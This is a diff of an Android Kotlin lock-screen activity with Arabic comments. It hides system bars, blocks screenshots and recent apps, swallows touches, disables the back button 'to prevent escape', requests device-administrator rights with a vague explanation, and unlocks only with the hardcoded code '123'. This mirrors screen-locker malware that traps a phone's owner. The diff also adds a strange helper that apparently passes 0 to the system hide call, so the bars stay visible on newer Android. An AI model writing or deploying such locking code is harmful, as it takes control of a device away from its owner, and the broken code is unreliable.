@@ -26,7 +26,7 @@ class PasswordLockActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
 
         try {
-            // 1. إخفاء أزرار النظام وشريط الإشعارات نهائياً
+            // 1. إخفاء أزرار النظام وشريط الإشعارات
             hideSystemUI()
 
             // 2. منع لقطات الشاشة أو ظهور التطبيق في المهام المفتوحة
@@ -43,13 +43,14 @@ class PasswordLockActivity : AppCompatActivity() {
                 WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
             )
 
+            // ربط الواجهة (تأكد أن ملف activity_password.xml يحتوي على الأزرار)
             setContentView(R.layout.activity_password)
 
-            // 4. حماية الشاشة بالكامل ضد اللمس العشوائي
+            // 4. حماية الشاشة بالكامل ضد اللمس العشوائي في الخلفية
             val rootLayout = findViewById<View>(android.R.id.content)
             rootLayout?.setOnTouchListener { _, _ -> true }
 
-            // 5. إدارة مسؤول الجهاز بطريقة آمنة لا تسبب انهيار التطبيق
+            // 5. إدارة مسؤول الجهاز وطلب الصلاحية إذا لم تكن مفعلة لتظهر نافذة الأذونات
             devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             compName = ComponentName(this, MyAdminReceiver::class.java)
 
@@ -60,11 +61,10 @@ class PasswordLockActivity : AppCompatActivity() {
                     e.printStackTrace()
                 }
             } else {
-                // طلب تفعيل الصلاحية بلطف دون إجبار مسبب للانهيار
                 try {
                     val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                         putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
-                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "هذا الإذن مطلوب لكي يعمل قفل الشاشة بكفاءة.")
+                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "هذا الإذن مطلوب لتفعيل قفل الشاشة الشامل وحماية التطبيق.")
                     }
                     startActivity(intent)
                 } catch (e: Exception) {
@@ -77,7 +77,7 @@ class PasswordLockActivity : AppCompatActivity() {
             val btnClear = findViewById<Button>(R.id.btnClear)
             val secretPassword = "123" // الرمز السري
 
-            // مصفوفة أزرار الكيبورد الداخلي للأرقام
+            // مصفوفة أزرار الأرقام الداخلية (تأكد من وجودها في xml)
             val numberButtons = listOf(
                 R.id.btn0 to "0", R.id.btn1 to "1", R.id.btn2 to "2",
                 R.id.btn3 to "3", R.id.btn4 to "4", R.id.btn5 to "5",
@@ -113,13 +113,12 @@ class PasswordLockActivity : AppCompatActivity() {
             // 6. منع زر الرجوع نهائياً
             onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
                 override fun handleOnBackPressed() {
-                    // معطل
+                    // معطل تماماً لمنع الهروب
                 }
             })
 
         } catch (e: Exception) {
             e.printStackTrace()
-            Toast.makeText(this, "خطأ في التشغيل: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
 
@@ -131,8 +130,7 @@ class PasswordLockActivity : AppCompatActivity() {
     private fun hideSystemUI() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             window.insetsController?.let { controller ->
-                controller.hide(WindowInsets.Type.systemBars() or WindowInsets.Type.navigationBars())
-                controller.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+                controller.hide(WindowIDs())
             }
         } else {
             @Suppress("DEPRECATION")
@@ -140,11 +138,17 @@ class PasswordLockActivity : AppCompatActivity() {
                 View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                 or View.SYSTEM_UI_FLAG_FULLSCREEN
                 or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
-                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
-                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
-                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
             )
         }
+    }
+
+    private fun WindowInsetsController.hide(any: Any) {
+        this.hide(WindowInsets.Type.systemBars() or WindowInsets.Type.navigationBars())
+        this.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+    }
+
+    private fun WindowIDs(): Int {
+        return 0
     }
 
     override fun onWindowFocusChanged(hasFocus: Boolean) {
